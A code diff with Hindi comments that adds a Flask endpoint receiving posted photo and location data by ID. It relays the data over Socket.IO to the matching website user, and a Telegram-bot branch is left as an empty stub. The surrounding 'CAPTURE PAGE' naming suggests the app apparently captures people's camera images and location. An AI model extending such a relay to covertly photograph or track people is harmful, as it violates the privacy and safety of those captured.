@@ -541,6 +541,31 @@ def on_join(data):
     if room:
         join_room(room)
         print(f"User joined room: {room}")
+        # --------- वेबसाइट और टेलीग्राम को कनेक्ट करने वाला नया कोड ---------
+@app.route('/receive_data', methods=['POST'])
+def receive_data():
+    data = request.json or {}
+    
+    # यह ID टेलीग्राम की होगी (नंबर) या वेबसाइट की (जैसे: 550e84...)
+    target_id = str(data.get('id')) 
+    photo_data = data.get('photo')
+    location_data = data.get('location')
+
+    # अगर target_id में सिर्फ नंबर हैं, तो यह टेलीग्राम का यूजर है
+    if target_id.isdigit():
+        # (यहाँ आपके टेलीग्राम बोट से यूजर को डेटा भेजने वाला कोड आएगा)
+        pass 
+        
+    # अगर नंबर नहीं है, तो यह वेबसाइट का यूजर है
+    else:
+        # यह कोड सीधा उस यूजर की वेबसाइट स्क्रीन पर डेटा भेज देगा
+        socketio.emit('capture_result', {
+            'photo': photo_data,
+            'location': location_data
+        }, room=target_id)
+        
+    return jsonify({"status": "success"}), 200
+# ---------------------------------------------------------------------
 
 # ==================== CAPTURE PAGE ====================
 
